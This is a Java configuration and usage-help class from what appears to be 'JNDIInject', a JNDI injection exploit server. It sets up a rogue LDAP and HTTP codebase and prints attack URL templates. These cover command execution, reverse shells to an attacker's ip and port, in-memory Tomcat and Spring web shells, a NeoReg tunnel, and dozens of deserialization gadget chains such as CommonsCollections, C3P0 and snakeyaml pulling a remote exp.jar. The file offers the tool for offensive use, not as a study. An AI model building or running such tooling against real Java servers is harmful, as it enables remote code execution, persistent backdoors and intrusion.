package com.bloom.util;

import com.beust.jcommander.JCommander;
import com.beust.jcommander.Parameter;
import com.beust.jcommander.UnixStyleUsageFormatter;
import org.springframework.util.DigestUtils;

import java.io.UnsupportedEncodingException;

public class config {
    public static String codeBase;

    @Parameter(names = {"-i", "--ip"}, description = "Local ip address ", required = true, order = 1)
    public static String ip = "0.0.0.0";

    @Parameter(names = {"-l", "--ldapPort"}, description = "Ldap bind port", order = 2)
    public static int ldapPort = 1389;

    @Parameter(names = {"-p", "--httpPort"}, description = "Http bind port", order = 3)
    public static int httpPort = 8080;

    @Parameter(names = {"-u", "--usage"}, description = "Show ALL usage", order = 5)
    public static boolean showUsage =false;



    @Parameter(names = {"-h", "--help"}, help = true, description = "Show this help")
    private static boolean help = false;


    public static void applyCmdArgs(String[] args) {
        //process cmd args
        JCommander jc = JCommander.newBuilder()
                .addObject(new config())
                .build();
        try{
            jc.parse(args);
        }catch(Exception e){
            if(!showUsage){
                System.out.println("Error: " + e.getMessage() + "\n");
                help = true;
            }
        }

//        if(showformat){
//            String ip = (config.ip != null) ? config.ip : "[IP]";
//            String port = (config.ip != null) ? config.ldapPort + "" : "[PORT]";
//
//            System.out.println("Supported LADP Queries：");
//            System.out.println("* all words are case INSENSITIVE when send to ldap server");
//            String prefix = "ldap://" + config.ip + ":" + config.ldapPort + "/";
//            System.out.println("\n[+] Basic Queries: " + prefix + "basic/[PayloadType]/[Params], e.g.");
//            System.out.println("    " + prefix + "basic/Command/base64/[base64_encoded_cmd]");
//            System.out.println("    " + prefix + "basic/ReverseShell/[ip]/[port]  ---windows NOT supported");
//
//
//            System.out.println("\n[+] ByPass Queries: " + prefix + "[PayloadType]/[Type]/[Params], e.g.");
//            System.out.println("    Example:" + prefix + "EL/[cmd]");
//            System.out.println("    Example:" + prefix + "EL/base64/[base64_encoded_cmd]");
//            System.out.println("    Example:" + prefix + "EL/reverseshell/[ip]/[port]  ---windows NOT supported");
//            System.out.println("    Example:" + prefix + "EL/reverseshell2/[ip]/[port]  ---windows NOT supported");
//
//            System.out.println("\n[+] fuzzbyDNS Queries: " + prefix + "fuzzbyDNS/[domain], e.g.");
//            System.out.println("    Example:" + prefix + "fuzzbyDNS/[domain]");
//
//            System.out.println("\n[+] Fuzz Queries: " + prefix + "fuzz/[GadgetType]/[domain], e.g.");
//            System.out.println("    Example:" + prefix + "fuzz/EL/[domain]");
//
//            System.exit(0);
//        }


        if(showUsage){
            String ip = (config.ip != null) ? config.ip : "[IP]";
            String port = (config.ip != null) ? config.ldapPort + "" : "[PORT]";

            System.out.println("Supported LADP Queries：");
            System.out.println("* all words are case INSENSITIVE when send to ldap server");
            String prefix = "ldap://" + config.ip + ":" + config.ldapPort + "/";
            System.out.println("\n[+] Basic Queries: " + prefix + "basic/[PayloadType]/[Params], e.g.");
            System.out.println("    " + prefix + "basic/Command/base64/[base64_encoded_cmd]");
            System.out.println("    " + prefix + "basic/ReverseShell/[ip]/[port]  ---windows NOT supported");


            System.out.println("\n[+] ByPass Queries: " + prefix + "[PayloadType]/[Type]/[Params], e.g.");
            System.out.println("    " + prefix + "URLDNS/[domain]");
            System.out.println("    " + prefix + "EL/[cmd]");
            System.out.println("    " + prefix + "EL/base64/[base64_encoded_cmd]");
            System.out.println("    " + prefix + "EL/reverseshell/[ip]/[port]  ---windows NOT supported");
            System.out.println("    " + prefix + "EL/reverseshell2/[ip]/[port]  ---windows NOT supported");


            System.out.println("\n[+] Fuzz Queries: " + prefix + "fuzz/[GadgetType]/[domain], e.g.");
            System.out.println("    " + prefix + "fuzz/EL/[domain]");

            System.out.println("\n[+] FindGadgetByDNS Queries: " + prefix + "FindGadgetByDNS/[domain], e.g.");
            System.out.println("    " + prefix + "fuzzbyDNS/[domain]");

            UsageList(prefix);

            System.exit(0);
        }

//        //获取当前 Jar 的名称
//        String jarPath = Starter.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        jc.setProgramName("java -jar JNDIInject-1.2-SNAPSHOT.jar");
        jc.setUsageFormatter(new UnixStyleUsageFormatter(jc));

        if(help) {
            jc.usage(); //if -h specified, show help and exit
            System.exit(0);
        }

        // 特别注意：最后一个反斜杠不能少啊
        config.codeBase = "http://" + config.ip + ":" + config.httpPort + "/";
    }


//    public static void fuzzList(){
//        System.out.println();
//        System.out.println(" ----------------------------------------------------------------------------------------->");
//        System.out.println("    [*] Fuzz Payload that can be used: ");
//        System.out.println("     CommonsBeanutils1");
//        System.out.println("     CommonBeanutilsNoCC");
//        System.out.println("     CommonsCollections1");
//        System.out.println("     CommonsCollections2");
//        System.out.println("     CommonsCollections3");
//        System.out.println("     CommonsCollections4");
//        System.out.println("     CommonsCollections5");
//        System.out.println("     CommonsCollections6");
//        System.out.println("     CommonsCollections7");
//        System.out.println("     CommonsCollectionsK1");
//        System.out.println("     CommonsCollectionsK2");
//        System.out.println("     CommonsCollectionsK3");
//        System.out.println("     CommonsCollectionsK4");
//        System.out.println("     C3P0");
//        System.out.println("     C3P0Tomcat");
//        System.out.println("     groovyBytomcat");
//        System.out.println("     Clojure");
//        System.out.println("     BeanShell1");
//        System.out.println("     JSON1");
//        System.out.println("     Spring1");
//        System.out.println("     Spring2");
//        System.out.println("     Hibernate1");
//        System.out.println("     Myfaces1");
//        System.out.println("     MozillaRhino1");
//        System.out.println("     rome");
//        System.out.println("     groovy1");
//        System.out.println("     EL");
//        System.out.println("     snakeyaml");
//        System.out.println("     XStream");
//        System.out.println("     mvel");
//        System.out.println("     BeanShell2");
//        System.out.println("     tomcat_dbcp1_RCE");
//        System.out.println("     tomcat_dbcp2_RCE");
//        System.out.println("     commons_dbcp1_RCE");
//        System.out.println("     commons_dbcp2_RCE");
//        System.out.println("     druidjdbc");
//        System.out.println("     tomcatjdbc");
//        System.out.println("     Vaadin1");
//    }

    public static void UsageList(String prefix){
        System.out.println();
        System.out.println("   " + prefix + "URLDNS/[domain]");
        System.out.println("{------The following methods are supported memshell[以下方法支持内存马]-------------------}");
        System.out.println("   " + prefix + "basic/[cmd]");
        System.out.println("   " + prefix + "EL/[cmd]");
        System.out.println("   " + prefix + "CommonsBeanutils1/base64/[base64_encoded_cmd]");
        System.out.println("   " + prefix + "CommonsBeanutils183NOCC/ReverseShell/[ip]/[port]");
        System.out.println("   " + prefix + "CommonsBeanutils192NOCC/ReverseShell2/[ip]/[port]");
        System.out.println("   " + prefix + "CommonsCollections1/memshell/[memshellType]");
        System.out.println("   " + prefix + "CommonsCollections2/memshell/FILE:data/exp.class");
        System.out.println("   " + prefix + "CommonsCollections3/memshell/SpringInterceptorMemShell");
        System.out.println("   " + prefix + "CommonsCollections4/memshell/TomcatCmdEcho");
        System.out.println("   " + prefix + "CommonsCollections5/memshell/TomcatFilterMemShellFromThread");
        System.out.println("   " + prefix + "CommonsCollections6/memshell/TomcatFilterMemShellFromJMX");
        System.out.println("   " + prefix + "CommonsCollections7/memshell/TomcatListenerMemShellFromThread");
        System.out.println("   " + prefix + "CommonsCollectionsK1/memshell/TomcatListenerMemShellFromJMX");
        System.out.println("   " + prefix + "CommonsCollectionsK2/memshell/TomcatListenerNeoRegFromThread");
        System.out.println("   " + prefix + "CommonsCollectionsK3/memshell/TomcatServletMemShellFromThread");
        System.out.println("   " + prefix + "CommonsCollectionsK4/memshell/TomcatServletMemShellFromJMX");
        System.out.println("   " + prefix + "C3P0/http://127.0.0.1:8080:Exploit");
        System.out.println("   " + prefix + "Clojure/[cmd]");
        System.out.println("   " + prefix + "BeanShell1/[cmd]");
        System.out.println("   " + prefix + "JSON1/[cmd]");
        System.out.println("   " + prefix + "Spring1/[cmd]");
        System.out.println("   " + prefix + "Spring2/[cmd]");
        System.out.println("   " + prefix + "Hibernate1/[cmd]");
        System.out.println("   " + prefix + "Myfaces1/[cmd]");
        System.out.println("   " + prefix + "MozillaRhino1/[cmd]");
        System.out.println("   " + prefix + "rome/[cmd]");
        System.out.println("   " + prefix + "groovy1/[cmd]");
        System.out.println("   " + prefix + "Vaadin1/[cmd]");
        System.out.println("   " + prefix + "snakeyaml//http://127.0.0.1:8080/exp.jar");
        System.out.println("{------The following methods are supported memshell[以下方法不支持内存马]-------------------}");
        System.out.println("   " + prefix + "groovyBytomcat/[cmd]");
        System.out.println("   " + prefix + "XStream/[cmd]");
        System.out.println("   " + prefix + "mvel/[cmd]");
        System.out.println("   " + prefix + "BeanShell2/[cmd]");
        System.out.println("   " + prefix + "tomcat_dbcp1_RCE/[cmd]");
        System.out.println("   " + prefix + "tomcat_dbcp2_RCE/[cmd]");
        System.out.println("   " + prefix + "commons_dbcp1_RCE/[cmd]");
        System.out.println("   " + prefix + "commons_dbcp2_RCE/[cmd]");
        System.out.println("   " + prefix + "druidjdbc/[cmd]");
        System.out.println("   " + prefix + "tomcatjdbc/[cmd]");
    }


    public static void main(String[] args) {
        applyCmdArgs(args);
    }
}
